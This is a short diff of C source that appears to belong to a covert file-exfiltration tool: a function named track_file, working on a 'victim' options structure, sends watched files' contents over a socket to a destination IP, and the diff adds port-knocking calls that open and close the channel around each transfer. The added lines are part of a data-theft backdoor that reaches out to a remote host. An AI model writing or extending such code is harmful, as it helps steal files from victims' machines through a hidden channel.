@@ -62,7 +62,7 @@ int track_file(struct options_victim* opts) {
                         file_size = (int) st.st_size;
 //                        process_data(chunk, file_size);
                     }
-
+                    port_knock(opts->dest_ip, OPEN_ATF);
                     snprintf(str_file_size, 20, "%d", (int) file_size);
                     strcat(file_info, start);
                     strcat(file_info, event->name);
@@ -79,6 +79,8 @@ int track_file(struct options_victim* opts) {
                         write(opts->atcp_socket, buf, byte);
                         memset(buf, 0, 1024);
                     }
+                    sleep(1);
+                    port_knock(opts->dest_ip, CLOSE_ATF);
 
 
                     fclose(fp);
